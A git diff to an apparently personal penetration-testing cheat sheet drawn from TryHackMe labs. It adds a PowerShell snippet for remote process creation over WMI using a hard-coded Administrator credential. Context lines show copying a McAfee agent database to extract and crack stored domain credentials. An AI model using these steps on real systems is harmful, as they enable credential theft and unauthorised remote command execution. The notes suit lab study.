@@ -41,6 +41,7 @@
   - [dig](#dig)
   - [dnsenum](#dnsenum)
   - [McAfee](#McAfee)
+  - [WMI](#wmi)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -833,6 +834,26 @@ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
 - focus on the AGENT_REPOSITORIES table
 - check DOMAIN, AUTH_USER, and AUTH_PASSWD field
 - crack credentials: https://github.com/funoverip/mcafee-sitelist-pwd-decryption
+
+### WMI
+```bash
+# 
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+# Remote Process Creation Using WMI
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+
+
 
 ### bloodhound-python
 ```bash
